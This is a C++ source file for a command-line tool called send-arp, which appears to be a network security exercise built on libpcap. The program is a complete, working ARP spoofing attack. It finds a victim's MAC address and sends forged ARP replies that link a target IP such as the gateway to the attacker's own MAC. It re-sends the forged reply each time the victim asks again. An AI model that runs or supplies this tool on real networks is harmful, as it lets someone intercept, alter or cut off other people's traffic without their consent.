#include <pcap.h>
#include <stdio.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <linux/if_arp.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>

#define MAC_LEN 6
#define IP_LEN 4
#define TIME_INTERVAL 60

#pragma pack(push, 1)
typedef  struct _type_eth_arp{
    uint8_t dst_mac[MAC_LEN];
    uint8_t src_mac[MAC_LEN];
    uint16_t type;
    uint16_t hw_type;
    uint16_t proto_type;
    uint8_t hw_len;
    uint8_t proto_len;
    uint16_t op_code;
    uint8_t s_mac[MAC_LEN];
    in_addr s_ip;
    uint8_t t_mac[MAC_LEN];
    in_addr t_ip;
} type_eth_arp;
#pragma pack(pop)

bool get_my_mac(char* dev,uint8_t *a_mac){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
    
    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        for (int i = 0; i < 6; i++)
            a_mac[i]=s.ifr_addr.sa_data[i];
    }
    else
        return false;
    return true;
}

bool get_my_ip (char * dev,in_addr *a_ip) {
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, dev);
    if (0 == ioctl(sockfd, SIOCGIFADDR, &ifrq))  {
        sin = reinterpret_cast<struct sockaddr_in *>(&ifrq.ifr_addr);
        memcpy (a_ip, reinterpret_cast<void *>(&sin->sin_addr), sizeof(sin->sin_addr));
    }
    else
        return false;
    return true;
}

struct _type_eth_arp make_broadcast_packet(uint8_t *s_mac,in_addr s_ip,in_addr t_ip){
    type_eth_arp tmp;
    memcpy(tmp.src_mac,s_mac,MAC_LEN);
    memset(tmp.dst_mac,0xff,MAC_LEN);
    tmp.type = htons(ETHERTYPE_ARP);
    tmp.hw_type = htons(ARPHRD_ETHER);
    tmp.proto_type = htons(ETHERTYPE_IP);
    tmp.hw_len = MAC_LEN;
    tmp.proto_len = IP_LEN;
    tmp.op_code = htons(ARPOP_REQUEST);
    memcpy(tmp.s_mac,s_mac,MAC_LEN);
    tmp.s_ip = s_ip;
    memset(tmp.t_mac,0x00,MAC_LEN);
    tmp.t_ip = t_ip;
    return tmp;
}

void time_error(int signo){
    printf("error : No Macs found for corresponding IP\n");
    exit(1);
}

void make_infection_packet(pcap_t * handle, type_eth_arp *tmp, in_addr fake_ip){
    struct sigaction act;
    act.sa_handler = time_error;
    sigemptyset(&act.sa_mask);
    act.sa_flags = 0;
    sigaction(SIGALRM, &act, nullptr);
    alarm(TIME_INTERVAL);
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        pcap_sendpacket(handle,reinterpret_cast<const u_char*>(tmp),sizeof (type_eth_arp));
        type_eth_arp *earp = reinterpret_cast<type_eth_arp *>(const_cast<u_char*>(packet));
        if (ntohs(earp->type) != ETHERTYPE_ARP )
            continue;
        if ((earp->s_ip.s_addr == tmp->t_ip.s_addr) && (earp->t_ip.s_addr == tmp->s_ip.s_addr) && (ntohs(earp->op_code) == ARPOP_REPLY)){
            memcpy(tmp->dst_mac,earp->s_mac,MAC_LEN);
            tmp->s_ip = fake_ip;
            memcpy(tmp->t_mac,earp->s_mac,MAC_LEN);
            tmp->op_code = htons(ARPOP_REPLY);
            alarm(0);
            break;
        }
    }
}

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp wlan0 192.168.0.10 192.168.0.1\n");
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    uint8_t my_mac[MAC_LEN];
    in_addr my_ip, sender_ip, target_ip;
    inet_aton(argv[2],&sender_ip);
    inet_aton(argv[3],&target_ip);
    if (get_my_mac(dev, my_mac) == false){
        printf("error : mac_address can't be imported\n");
        return -1;
    }
    if (get_my_ip(dev, &my_ip) == false){
        printf("error : ip_address can't be imported\n");
        return  -1;
    }
    
    type_eth_arp s_b = make_broadcast_packet(my_mac,my_ip,sender_ip);
    make_infection_packet(handle,&s_b,target_ip);
    printf("Send arp packet!\n");
    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&s_b), sizeof (type_eth_arp));
    pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&s_b), sizeof (type_eth_arp));
    
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        type_eth_arp *earp = reinterpret_cast<type_eth_arp *>(const_cast<u_char *>(packet));
        if(ntohs(earp->type) != ETHERTYPE_ARP)
            continue;
        if((earp->s_ip.s_addr == s_b.t_ip.s_addr) && (earp->t_ip.s_addr == s_b.s_ip.s_addr) && (ntohs(earp->op_code) == ARPOP_REQUEST)){
            printf("send reply packet\n");
            pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&s_b), sizeof (type_eth_arp));
        }
    }
    pcap_close(handle);
}



